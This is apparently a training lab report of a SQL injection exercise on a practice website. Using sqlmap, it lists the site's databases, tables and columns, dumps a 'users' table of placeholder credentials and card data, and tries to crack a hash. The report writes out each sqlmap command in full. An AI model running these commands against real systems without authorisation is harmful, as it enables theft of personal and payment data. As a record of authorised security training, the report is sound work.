SQL Injection Report  
 Target: [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  
 Environment: Kali Linux on VMware  
 Date: 26th April 2025

Objective:  
 To perform SQL Injection on the target to enumerate databases, tables, columns, and dump sensitive data.

Tools Used:

* Operating System: Kali Linux (on VMware)

* Tool: sqlmap

Steps and Commands Used:

1. Testing the URL for SQL Injection and listing databases:  
    Command used:  
    sqlmap \-u "[http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)" \--dbs

</p>

Finding:  
 Found multiple databases, including one named 'acuart'.

2. Listing tables inside the 'acuart' database:  
    Command used:  
    sqlmap \-u "[http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)" \-D acuart \--tables

  <em>Figure 4.1: Listing Table .</em>
</p>

Finding:  
 Found tables, including a table named 'users'.

3. Listing columns inside the 'users' table:  
    Command used:  
    sqlmap \-u "[http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)" \-D acuart \-T users \--columns

  </p>
Finding:  
 Found columns such as cc, cart, pass, email, phone, uname, name, and address.

4. Dumping all data from the 'users' table:  
    Command used:  
    sqlmap \-u "[http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)" \-D acuart \-T users \--dump

Finding:  
 Successfully extracted the following data:

* Name: John Smith

* Address: 21 street

* Username: test

* Password: test

* Email: email@email.com

* Phone: 2323345

* Credit Card Number (cc): 1234-5678-2300-9000

* Cart (MD5 hash): 3c038f135656b21d2f562c4d0c600118

  </p>

5. Handling password hashes:  
    When sqlmap detected a hash in the 'cart' field, it asked if we wanted to store and attempt to crack it.

* Stored the hash in a temporary file.

* Attempted cracking with the default wordlist and common suffixes.

* Cracking attempt was unsuccessful; no clear password found.

Summary:  
 The target website was vulnerable to SQL Injection.  
 Databases, tables, columns, and actual sensitive data were successfully extracted.  
 Password cracking on the 'cart' field hash was attempted but not successful.

Conclusion:  
 SQL Injection was effective. Sensitive user information was exposed, including emails, passwords, credit card numbers, and phone numbers. The site is critically vulnerable and needs immediate remediation.
